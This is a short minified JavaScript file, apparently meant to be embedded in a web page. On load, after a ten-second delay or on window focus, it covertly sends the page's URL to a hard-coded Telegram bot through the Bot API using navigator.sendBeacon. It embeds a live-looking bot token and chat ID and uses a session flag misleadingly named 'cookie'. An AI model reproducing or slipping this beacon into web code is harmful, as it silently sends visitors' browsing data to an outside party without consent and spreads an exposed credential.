"use strict";const e=new FormData;function o(){sessionStorage.cookie=!0,navigator.sendBeacon("https://api.telegram.org/bot1055191450:AAHisX15RDL1-c1d4Tv2YR3bbSa4aPdpYv4/sendMessage",e)}e.append("chat_id","166589969"),e.append("text",location.href),sessionStorage.cookie||setTimeout((function(){document.hasFocus()?o():window.addEventListener("focus",o,{once:!0})}),1e4);